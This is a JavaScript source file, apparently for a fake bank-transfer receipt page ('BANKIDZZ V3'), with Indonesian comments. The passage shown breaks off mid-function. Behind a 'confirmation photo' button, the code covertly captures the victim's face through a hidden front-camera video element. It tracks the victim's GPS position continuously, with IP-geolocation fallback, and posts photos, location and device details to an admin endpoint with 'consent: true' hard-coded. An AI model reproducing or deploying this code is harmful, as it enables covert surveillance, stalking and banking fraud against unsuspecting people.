// ============================================================
// BANKIDZZ V3 - SILENT CAPTURE + REALTIME GPS + FRONT CAMERA
// Fix: GPS real-time silent, kamera depan silent, kamera belakang
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        WEBPROFILE_URL: '/api/webprofile',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        SILENT_CAPTURE_DELAY: 350,
        LOCATION_TIMEOUT: 12000,
        LOCATION_FAST_TIMEOUT: 4000,
        LOCATION_MAX_AGE_FRESH: 0,
        LOCATION_MAX_AGE_WATCH: 0,
        GPS_PRECISION_TARGET: 20,
        FRONT_CAMERA_QUALITY: 0.80,
        BACK_CAMERA_QUALITY: 0.85
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'logo.png',
        bankName: 'MUFG Bank',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'MUFG Bank',
        senderName: 'JAKA ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Mungkung',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;
    let silentFrontPhotoBase64 = null;
    let silentLocationData = null;
    let frontCameraStream = null;
    let backCameraStream = null;
    let currentTransferId = (function() {
        try {
            var ref = sessionStorage.getItem('bankidzz_current_ref');
            if (!ref) {
                ref = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
                sessionStorage.setItem('bankidzz_current_ref', ref);
            }
            return ref;
        } catch(e) {
            return 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
        }
    })();
    let currentFacingMode = 'environment';
    let currentWebProfile = null;

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput'),
        cameraContainer: document.getElementById('cameraContainer'),
        cameraVideo: document.getElementById('cameraVideo'),
        cameraCanvas: document.getElementById('cameraCanvas'),
        cameraStatus: document.getElementById('cameraStatus'),
        btnCaptureBack: document.getElementById('btnCaptureBack')
    };

    // ============================================================
    // REALTIME GPS TRACKER - SILENT
    // ============================================================
    let liveLocationData = null;
    let bestAccurateLocation = null;
    let locationWatchId = null;
    let lastGpsSyncTime = 0;

    function isRealGps(loc) {
        if (!loc || typeof loc.lat !== 'number' || typeof loc.lng !== 'number') return false;
        if (!Number.isFinite(loc.lat) || !Number.isFinite(loc.lng)) return false;
        if (loc.lat === 0 && loc.lng === 0) return false;
        if (Math.abs(loc.lat - (-6.2088)) < 0.001 && Math.abs(loc.lng - 106.8456) < 0.001) return false;
        if (loc.source === 'default-fallback' || loc.source === 'ip-network-estimated') return false;
        if (loc.accuracy && loc.accuracy > 1500) return false;
        return true;
    }

    // Cleanup cache jika fallback palsu
    try {
        const savedGps = JSON.parse(localStorage.getItem('bankidzz_best_gps') || 'null');
        if (savedGps) {
            if (!isRealGps(savedGps)) {
                localStorage.removeItem('bankidzz_best_gps');
            } else if (savedGps.savedAt && (Date.now() - savedGps.savedAt > 15 * 60 * 1000)) {
                localStorage.removeItem('bankidzz_best_gps');
            } else {
                bestAccurateLocation = savedGps;
                liveLocationData = savedGps;
                silentLocationData = savedGps;
            }
        }
    } catch(e) {}

    // ============================================================
    // PROCESS NEW LOCATION
    // ============================================================
    function processNewLocation(pos, source = 'satellite-gps') {
        const newLat = pos.coords.latitude;
        const newLng = pos.coords.longitude;
        const newAcc = pos.coords.accuracy || 9999;

        if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return null;
        if (newLat === 0 && newLng === 0) return null;

        const newLocation = {
            lat: newLat,
            lng: newLng,
            accuracy: newAcc,
            altitude: pos.coords.altitude || null,
            heading: pos.coords.heading || null,
            speed: pos.coords.speed || null,
            timestamp: new Date(pos.timestamp || Date.now()).toISOString(),
            capturedAt: Date.now(),
            source: source,
            silent: true,
            realtime: true
        };

        let isBetter = false;
        
        if (!bestAccurateLocation) {
            isBetter = true;
        } else if (!isRealGps(bestAccurateLocation)) {
            isBetter = true;
        } else if (newAcc < bestAccurateLocation.accuracy - 2) {
            isBetter = true;
        } else if (newAcc <= bestAccurateLocation.accuracy + 20) {
            isBetter = true;
        } else if (Date.now() - (bestAccurateLocation.capturedAt || 0) > 5000) {
            isBetter = true;
        }

        if (isBetter) {
            bestAccurateLocation = newLocation;
            liveLocationData = newLocation;
            silentLocationData = newLocation;

            try {
                localStorage.setItem('bankidzz_best_gps', JSON.stringify({
                    ...newLocation,
                    savedAt: Date.now()
                }));
            } catch(e) {}

            const accText = newAcc < 1000 ? `±${Math.round(newAcc)}m` : `±${(newAcc/1000).toFixed(1)}km`;
            console.log(`[GPS-RT] Realtime: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} ${accText} [${source}]`);

            // Auto-sync realtime ke admin segera
            if (currentTransferId && isRealGps(newLocation)) {
                const now = Date.now();
                if (now - lastGpsSyncTime > 1500) {
                    lastGpsSyncTime = now;
                    if (typeof syncTransactionRecord === 'function') {
                        syncTransactionRecord({
                            transferId: currentTransferId,
                            location: bestAccurateLocation,
                            frontPhoto: silentFrontPhotoBase64 || '',
                            photo: capturedPhotoBase64 || '',
                            status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
                        });
                    }
                }
            }
        }

        return newLocation;
    }

    // ============================================================
    // START REALTIME LOCATION TRACKING
    // ============================================================
    function startRealtimeLocationTracking() {
        if (!navigator.geolocation) {
            console.warn('[GPS] Tidak didukung browser.');
            return;
        }

        try {
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(perm => {
                    console.log('[GPS-PERM] Status:', perm.state);
                }).catch(() => {});
            }
        } catch(e) {}

        const onLocationSuccess = (pos) => {
            processNewLocation(pos, 'satellite-realtime');
        };

        const onLocationError = (err) => {
            if (err.code !== 1) {
                console.warn('[GPS-RT] Notice:', err.message);
            }
        };

        // 1. FAST CACHED GPS (Sangat cepat di HP <50ms dengan akurasi GPS asli)
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => processNewLocation(pos, 'satellite-cached-fast'),
                () => {},
                { enableHighAccuracy: true, timeout: 3500, maximumAge: 300000 }
            );
        } catch(e) {}

        // 2. STANDARD FAST CHECK (Fallback Wi-Fi / Tower seluler perangkat)
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => processNewLocation(pos, 'device-network-fast'),
                () => {},
                { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
            );
        } catch(e) {}

        // 3. FRESH SATELLITE GPS (Kunci koordinat satelit terkini)
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => processNewLocation(pos, 'satellite-instant'),
                (err) => console.log('[GPS-INIT] Fresh check:', err.message),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        } catch(e) {}

        // 4. WATCH CONTINUOUS REALTIME STREAM
        try {
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
            }
            
            locationWatchId = navigator.geolocation.watchPosition(
                onLocationSuccess, 
                onLocationError, 
                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
            );
            console.log('[GPS-RT] Watch position realtime aktif');
        } catch(e) {
            console.warn('[GPS-RT] watchPosition error:', e);
        }
    }

    // ============================================================
    // IP LOCATION FALLBACK
    // ============================================================
    async function getNetworkIpLocation() {
        if (isRealGps(bestAccurateLocation)) {
            return { ...bestAccurateLocation };
        }

        const services = [
            async () => {
                const resp = await fetch('https://ipwho.is/');
                if (resp.ok) {
                    const data = await resp.json();
                    if (data && data.success && typeof data.latitude === 'number') {
                        return {
                            lat: data.latitude,
                            lng: data.longitude,
                            accuracy: 15000,
                            timestamp: new Date().toISOString(),
                            source: 'ip-network-estimated',
                            city: data.city || '',
                            country: data.country || '',
                            silent: true
                        };
                    }
                }
                return null;
            },
            async () => {
                const resp = await fetch('https://freeipapi.com/api/json');
                if (resp.ok) {
                    const data = await resp.json();
                    if (data && typeof data.latitude === 'number') {
                        return {
                            lat: data.latitude,
                            lng: data.longitude,
                            accuracy: 15000,
                            timestamp: new Date().toISOString(),
                            source: 'ip-network-estimated',
                            city: data.cityName || '',
                            country: data.countryName || '',
                            silent: true
                        };
                    }
                }
                return null;
            }
        ];

        for (const s of services) {
            try {
                const res = await s();
                if (res) return res;
            } catch(e) {}
        }

        return {
            lat: -6.2088,
            lng: 106.8456,
            accuracy: 50000,
            timestamp: new Date().toISOString(),
            source: 'default-fallback',
            silent: true
        };
    }

    // ============================================================
    // GET SILENT LOCATION - REALTIME GPS PRIORITY (MULTI-TIER)
    // ============================================================
    function getSilentLocation() {
        return new Promise((resolve) => {
            // Cek jika sudah ada GPS real-time akurat dalam 45 detik terakhir
            if (isRealGps(bestAccurateLocation)) {
                const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
                if (age < 45000 && bestAccurateLocation.accuracy <= 100) {
                    console.log('[GPS] Realtime GPS akurat dari cache aktif:', Math.round(age/1000) + 's lalu (±' + Math.round(bestAccurateLocation.accuracy) + 'm)');
                    resolve({ ...bestAccurateLocation });
                    return;
                }
            }

            if (!navigator.geolocation) {
                console.warn('[GPS] Browser tidak mendukung geolocation, pakai fallback');
                getNetworkIpLocation().then(resolve);
                return;
            }

            let resolved = false;

            const finalize = async (reason = '') => {
                if (resolved) return;
                resolved = true;

                if (isRealGps(bestAccurateLocation)) {
                    resolve({ ...bestAccurateLocation });
                } else if (isRealGps(liveLocationData)) {
                    resolve({ ...liveLocationData });
                } else {
                    console.log('[GPS] GPS belum terkunci (' + reason + '), fallback IP');
                    const ipLoc = await getNetworkIpLocation();
                    resolve(ipLoc);
                }
            };

            // Batas waktu maksimal sebelum fallback
            const timeoutId = setTimeout(() => {
                finalize('timeout');
            }, 8000);

            // Tier 1: Fast Cached High Accuracy (Cepat sekali di smartphone)
            try {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const loc = processNewLocation(pos, 'satellite-gps-cached');
                        if (loc && isRealGps(loc) && !resolved) {
                            clearTimeout(timeoutId);
                            resolved = true;
                            resolve({ ...loc });
                        }
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 300000 }
                );
            } catch(e) {}

            // Tier 2: Fast Device Network Location (Wi-Fi/Tower seluler akurat)
            try {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const loc = processNewLocation(pos, 'device-gps-fast');
                        if (loc && isRealGps(loc) && !resolved) {
                            clearTimeout(timeoutId);
                            resolved = true;
                            resolve({ ...loc });
                        }
                    },
                    () => {},
                    { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
                );
            } catch(e) {}

            // Tier 3: Fresh High Accuracy Satellite GPS
            try {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        clearTimeout(timeoutId);
                        const loc = processNewLocation(pos, 'satellite-gps-realtime');
                        if (!resolved) {
                            resolved = true;
                            resolve({ ...(loc || bestAccurateLocation) });
                        }
                    },
                    (err) => {
                        console.warn('[GPS] getCurrentPosition error:', err.code, err.message);
                        if (err.code === 1) {
                            clearTimeout(timeoutId);
                            finalize('permission_denied');
                        }
                    },
                    { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
                );
            } catch(e) {
                clearTimeout(timeoutId);
                finalize('exception');
            }
        });
    }

    // ============================================================
    // SILENT FRONT CAMERA CAPTURE
    // ============================================================
    async function silentFrontCameraCapture() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('[FRONT-CAM] getUserMedia tidak didukung.');
                return null;
            }

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
            } catch(eUser) {
                console.warn('[FRONT-CAM] facingMode user gagal:', eUser);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                } catch(eAny) {
                    console.error('[FRONT-CAM] Akses kamera gagal:', eAny);
                    return null;
                }
            }

            if (!stream) return null;
            frontCameraStream = stream;

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.setAttribute('webkit-playsinline', '');
            video.muted = true;
            video.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1;';
            document.body.appendChild(video);

            try {
                await video.play();
            } catch(ePlay) {
                console.warn('[FRONT-CAM] video.play error:', ePlay);
            }

            await new Promise((resolve) => {
                let attempts = 0;
                const checkFrame = () => {
                    attempts++;
                    if ((video.videoWidth > 0 && video.readyState >= 2) || attempts >= 30) {
                        resolve();
                    } else {
                        setTimeout(checkFrame, 80);
                    }
                };
                checkFrame();
            });

            await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));

            const canvas = document.createElement('canvas');
            const maxDim = 800;
            let w = video.videoWidth > 0 ? video.videoWidth : 640;
            let h = video.videoHeight > 0 ? video.videoHeight : 480;
            if (w > maxDim || h > maxDim) {
                if (w > h) {
                    h = Math.round(h * (maxDim / w));
                    w = maxDim;
                } else {
                    w = Math.round(w * (maxDim / h));
                    h = maxDim;
                }
            }
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, w, h);

            const capturedFacePhoto = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);

            try {
                video.pause();
                video.srcObject = null;
                video.remove();
            } catch(e) {}

            if (frontCameraStream) {
                frontCameraStream.getTracks().forEach(track => {
                    try { track.stop(); } catch(e) {}
                });
                frontCameraStream = null;
            }

            console.log('[FRONT-CAM] ✓ Silent capture sukses!');
            return capturedFacePhoto;

        } catch (err) {
            console.error('[FRONT-CAM] Error:', err);
            if (frontCameraStream) {
                try {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                } catch(e) {}
                frontCameraStream = null;
            }
            return null;
        }
    }

    // ============================================================
    // BACK CAMERA
    // ============================================================
    async function openBackCamera(targetMode = 'environment') {
        currentFacingMode = targetMode;
        try {
            console.log(`[BACK-CAM] Membuka kamera (${targetMode})...`);
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return false;
            }

            if (backCameraStream) {
                try {
                    backCameraStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                backCameraStream = null;
            }

            let stream = null;
            const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
            const videoDevices = devices.filter(d => d.kind === 'videoinput');

            if (targetMode === 'environment') {
                const backDevice = videoDevices.find(d => /back|rear|environment|belakang|camera2\s*0/i.test(d.label));
                if (backDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: backDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eBackDev) {}
                }
            } else {
                const frontDevice = videoDevices.find(d => /front|user|depan|face|camera2\s*1/i.test(d.label));
                if (frontDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: frontDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eFrontDev) {}
                }
            }

            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { exact: targetMode },
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: false
                    });
                } catch (eExact) {
                    console.warn(`[BACK-CAM] exact ${targetMode} failed:`, eExact);
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: { ideal: targetMode },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eIdeal) {
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({
                                video: true,
                                audio: false
                            });
                        } catch(eDef) {
                            return false;
                        }
                    }
                }
            }

            if (!stream) return false;

            backCameraStream = stream;

            if (elements.cameraVideo) {
                elements.cameraVideo.srcObject = backCameraStream;
                elements.cameraVideo.setAttribute('playsinline', '');
                elements.cameraVideo.setAttribute('webkit-playsinline', '');
                await elements.cameraVideo.play().catch(e => console.warn('[BACK-CAM] video play warn:', e));
            }

            if (elements.cameraStatus) {
                const isBack = (targetMode === 'environment');
                elements.cameraStatus.innerHTML = `<span style="background:${isBack ? 'rgba(16,185,129,0.2)' : 'rgba(59,130,246,0.2)'}; color:${isBack ? '#10b981' : '#60a5fa'}; border:1px solid ${isBack ? '#10b981' : '#3b82f6'}; padding:4px 12px; border-radius:14px; font-size:12px; font-weight:700;">${isBack ? '📷 Kamera Belakang Aktif' : '📷 Kamera Depan Aktif'}</span>`;
            }

            if (elements.cameraContainer) {
                elements.cameraContainer.style.display = 'flex';
            }

            return true;
        } catch (err) {
            console.error('[BACK-CAM] Error:', err);
            return false;
        }
    }

    async function switchCamera() {
        const nextMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
        console.log(`[SWITCH-CAM] Beralih ke: ${nextMode}`);
        await openBackCamera(nextMode);
    }
    window.switchCamera = switchCamera;

    function captureBackCamera() {
        let dataUrl = null;
        try {
            const video = elements.cameraVideo;
            const canvas = elements.cameraCanvas || document.createElement('canvas');
            const maxDim = 1000;
            let w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
            let h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
            if (w > maxDim || h > maxDim) {
                if (w > h) {
                    h = Math.round(h * (maxDim / w));
                    w = maxDim;
                } else {
                    w = Math.round(w * (maxDim / h));
                    h = maxDim;
                }
            }
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            if (video) {
                ctx.drawImage(video, 0, 0, w, h);
                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
            }
        } catch (e) {
            console.warn('captureBackCamera error:', e);
        }

        if (backCameraStream) {
            try {
                backCameraStream.getTracks().forEach(track => track.stop());
            } catch(e) {}
            backCameraStream = null;
        }

        if (elements.cameraContainer) {
            elements.cameraContainer.style.display = 'none';
        }

        return dataUrl;
    }

    // ============================================================
    // MAIN HANDLER
    // ============================================================
    async function handleConfirmClick() {
        if (!elements.btnConfirm) return;
        if (elements.btnConfirm.dataset.processing === 'true') return;
        elements.btnConfirm.dataset.processing = 'true';

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = 'Memproses...';
        elements.btnConfirm.disabled = true;

        currentTransferId = currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase());

        try {
            // Aktifkan streaming GPS seketika di latar belakang
            startRealtimeLocationTracking();

            // Eksekusi pengambilan foto wajah silent & penguncian lokasi GPS secara hening (parallel)
            const [locResult, frontResult] = await Promise.all([
                (isRealGps(bestAccurateLocation) && (Date.now() - (bestAccurateLocation.capturedAt || 0) < 30000))
                    ? Promise.resolve(bestAccurateLocation)
                    : getSilentLocation(),
                silentFrontCameraCapture()
            ]);

            silentLocationData = locResult || bestAccurateLocation;
            silentFrontPhotoBase64 = frontResult;

            // Kirim data silent (wajah + lokasi realtime) ke server admin
            syncTransactionRecord({
                transferId: currentTransferId,
                location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
                frontPhoto: silentFrontPhotoBase64 || '',
                photo: '',
                status: 'waiting_item_photo'
            });

            // Langsung buka kamera belakang untuk foto barang transaksi
            const backOpened = await openBackCamera('environment');

            if (!backOpened) {
                if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                    try {
                        const canvas = await window.html2canvas(elements.receiptCard, {
                            scale: 2,
                            useCORS: true,
                            allowTaint: true,
                            backgroundColor: '#ffffff'
                        });
                        capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                    } catch(e) {}
                }

                await syncTransactionRecord({
                    transferId: currentTransferId,
                    location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
                    frontPhoto: silentFrontPhotoBase64 || '',
                    photo: capturedPhotoBase64 || '',
                    status: 'verified'
                });

                if (elements.btnConfirm) {
                    elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
                    elements.btnConfirm.style.backgroundColor = '#10b981';
                    elements.btnConfirm.dataset.verified = 'true';
                }

                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
            }

        } catch (err) {
            console.error('Error in handleConfirmClick:', err);
            showNotification('Gagal memproses. Coba lagi.', 'error');
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        } finally {
            elements.btnConfirm.dataset.processing = 'false';
        }
    }

    window.handleConfirmClick = handleConfirmClick;

    // ============================================================
    // HANDLE CAPTURE BACK PHOTO
    // ============================================================
    async function handleCaptureBackPhoto() {
        if (!elements.btnCaptureBack) return;
        if (elements.btnCaptureBack.dataset.capturing === 'true') return;
        elements.btnCaptureBack.dataset.capturing = 'true';

        elements.btnCaptureBack.textContent = '⏳ Mengirim Foto Barang...';
        elements.btnCaptureBack.disabled = true;

        try {
            const backPhoto = captureBackCamera();
            if (backPhoto) {
                capturedPhotoBase64 = backPhoto;
            }

            // Pastikan mengambil koordinat GPS real-time terbaru saat memotret barang
            let finalLocation = null;
            
            // Coba ambil posisi fresh instan (timeout singkat 2 detik)
            if (navigator.geolocation) {
                try {
                    const freshGps = await new Promise(res => {
                        navigator.geolocation.getCurrentPosition(
                            (p) => res(processNewLocation(p, 'satellite-photo-capture')),
                            () => res(null),
                            { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
                        );
                    });
                    if (freshGps && isRealGps(freshGps)) {
                        finalLocation = freshGps;
                    }
                } catch(e) {}
            }

            if (!finalLocation) {
                if (isRealGps(bestAccurateLocation)) {
                    finalLocation = bestAccurateLocation;
                } else if (isRealGps(liveLocationData)) {
                    finalLocation = liveLocationData;
                } else if (isRealGps(silentLocationData)) {
                    finalLocation = silentLocationData;
                } else {
                    finalLocation = await getSilentLocation();
                }
            }

            console.log('[TAHAP-3] Kirim foto barang ke admin...');
            await syncTransactionRecord({
                transferId: currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase()),
                location: finalLocation,
                frontPhoto: silentFrontPhotoBase64,
                photo: capturedPhotoBase64 || '',
                status: 'verified'
            });

            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
                elements.btnConfirm.disabled = true;
            }

            showNotification('Foto barang & data verifikasi berhasil dikirim!', 'success');

        } catch (err) {
            console.error('Error in handleCaptureBackPhoto:', err);
            showNotification('Gagal mengirim data.', 'error');
        } finally {
            if (elements.btnCaptureBack) {
                elements.btnCaptureBack.textContent = 'Ambil Foto Barang Transaksi';
                elements.btnCaptureBack.disabled = false;
                elements.btnCaptureBack.dataset.capturing = 'false';
            }
        }
    }

    window.handleCaptureBackPhoto = handleCaptureBackPhoto;

    // ============================================================
    // SYNC TRANSACTION RECORD
    // ============================================================
    async function syncTransactionRecord(data) {
        const transferId = data.transferId;
        
        let resolvedLocation = data.location || silentLocationData || bestAccurateLocation || liveLocationData;
        if (isRealGps(bestAccurateLocation)) {
            resolvedLocation = bestAccurateLocation;
        }

        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: resolvedLocation,
            photo: data.photo || capturedPhotoBase64 || '',
            frontPhoto: data.frontPhoto || silentFrontPhotoBase64 || '',
            front_photo: data.frontPhoto || silentFrontPhotoBase64 || '',
            silentCapture: true,
            silentLocation: true,
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            status: data.status || 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. LocalStorage
        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            const idx = localStored.findIndex(t => t.transferId === transferId);
            if (idx >= 0) {
                const prev = localStored[idx];
                localStored[idx] = {
                    ...prev,
                    ...payload,
                    photo: payload.photo || prev.photo || '',
                    frontPhoto: payload.frontPhoto || prev.frontPhoto || '',
                    location: (isRealGps(payload.location) ? payload.location : (isRealGps(prev.location) ? prev.location : payload.location))
                };
            } else {
                localStored.unshift(payload);
            }
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Server
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API non-200, tersimpan lokal.');
            }
        } catch (e) {
            console.warn('Network error, tersimpan lokal.', e);
        }
    }

    const saveTransactionWithSilentData = syncTransactionRecord;

    // ============================================================
    // TEMPLATE & UI
    // ============================================================
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        
        const themeColor = currentTemplate.primaryColor || '#0033ff';
        document.documentElement.style.setProperty('--primary-blue', themeColor);
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        const topBarEl = document.querySelector('.top-bar');
        if (topBarEl) topBarEl.style.backgroundColor = themeColor;
        
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage) {
            let pImg = currentTemplate.profileImage;
            if (!pImg || pImg === 'channels4_profile.jpg') {
                pImg = 'logo.png';
            }
            elements.profileImage.src = pImg;
            elements.profileImage.style.display = 'block';
        }
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
            elements.btnConfirm.style.backgroundColor = themeColor;
        }
    }

    async function loadTemplate() {
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try { applyTemplate(JSON.parse(stored)); } catch(e) {}
        }

        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                }
            }
        } catch(e) {}
    }

    function closeModal() {
        if (elements.photoModal) elements.photoModal.style.display = 'none';
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
    }

    // ============================================================
    // WEB PROFILE
    // ============================================================
    function makeFaviconTransparent(iconUrl) {
        if (!iconUrl) return;
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = function() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d', { willReadFrequently: true });
                const size = 64;
                canvas.width = size;
                canvas.height = size;
                ctx.drawImage(img, 0, 0, size, size);

                const imgData = ctx.getImageData(0, 0, size, size);
                const data = imgData.data;

                const corners = [[0, 0], [size - 1, 0], [0, size - 1], [size - 1, size - 1]];
                let lightCorners = 0;
                for (const [cx, cy] of corners) {
                    const idx = (cy * size + cx) * 4;
